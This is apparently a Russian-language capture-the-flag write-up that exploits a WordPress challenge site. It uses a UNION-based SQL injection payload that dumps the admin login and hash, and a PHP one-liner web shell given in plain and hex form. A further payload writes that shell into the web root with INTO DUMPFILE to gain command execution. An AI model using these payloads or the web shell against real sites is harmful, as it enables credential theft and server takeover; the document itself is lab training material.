# Shadow misconfig writeup

Получаем WP - приложение. Есть пара страниц-постов, защищенных паролями.

WpScan указывает на уязвомость:

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image.png)

Находим PoC:

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%201.png)

Работает!

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%202.png)

Декодируем бинарный текст, получаем пароль к одной из страниц.

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%203.png)

Пробуем ввести пароль и получаем ссылку на новую страницу:

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%204.png)

Это форма, где можно задать вопрос оракулу.

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%205.png)

Легко обнаруживаем SQLi уязвимость.

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%206.png)

Более того, это еще и UNION-based инъекция.

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%207.png)

Здесь мы воспользуемся мощным трюком — загрузкой веб шелла посредством UNION инъекции.

До этого я также проверил содержимое базы, ничего инетересного не нашел, админский хеш не реверсится.

Интересный момент — при попытке чтения данных из wordpress базы столкнулся с ошибкой “**Illegal Mix of Collation For Operation 'UNION'** ”. Это обходится несложно, всего лишь нужно обернуть SELECT clause (в моем случае еще был GROUP_CONCAT), в обертку `uncompress(compress(…))` . После этого ошибка пропадает

```php
question=' UNION SELECT 1,(SELECT uncompress(compress(GROUP_CONCAT(user_login, user_pass SEPARATOR '/'))) FROM wordpress.wp_users WHERE user_login='admin') #
```

Делаем тестовую атаку — в бурпе прописываем простой пейлоад:

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%208.png)

И пробуем достучаться к этому файлу по корню сайта.

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%209.png)

RCE в наших руках. Осталось развить атаку. Попробуем написать пейлоад поинтереснее.

На будущее — вот неплохой вариант короткого однострочника-шелла на php:

```php
<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

```php
0x3c212d2d2053696d706c6520504850204261636b646f6f7220427920444b20284f6e652d4c696e65722056657273696f6e29202d2d3e0a3c212d2d2055736167653a20687474703a2f2f7461726765742e636f6d2f73696d706c652d6261636b646f6f722e7068703f636d643d6361742b2f6574632f706173737764202d2d3e0a3c3f70687020696628697373657428245f524551554553545b27636d64275d29297b206563686f20223c7072653e223b2024636d64203d2028245f524551554553545b27636d64275d293b2073797374656d2824636d64293b206563686f20223c2f7072653e223b206469653b207d3f3e
```

Размещаем шелл для эскалации:

```php
question=' UNION SELECT 1,0x3c212d2d2053696d706c6520504850204261636b646f6f7220427920444b20284f6e652d4c696e65722056657273696f6e29202d2d3e0a3c212d2d2055736167653a20687474703a2f2f7461726765742e636f6d2f73696d706c652d6261636b646f6f722e7068703f636d643d6361742b2f6574632f706173737764202d2d3e0a3c3f70687020696628697373657428245f524551554553545b27636d64275d29297b206563686f20223c7072653e223b2024636d64203d2028245f524551554553545b27636d64275d293b2073797374656d2824636d64293b206563686f20223c2f7072653e223b206469653b207d3f3e INTO DUMPFILE '/var/www/html/40845778436153ae58a101027fa63c2d/ev1l.php' #
```

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%2010.png)

И проверяем, как работает, передаем параметром cmd команду:

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%2011.png)

Бинго. Осталось найти флаг, с этим без проблем справляемся грепом.

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%2012.png)

![image.png](Shadow%20misconfig%20writeup%20193021737a8980a68bf4f0233419175d/image%2013.png)

Победа!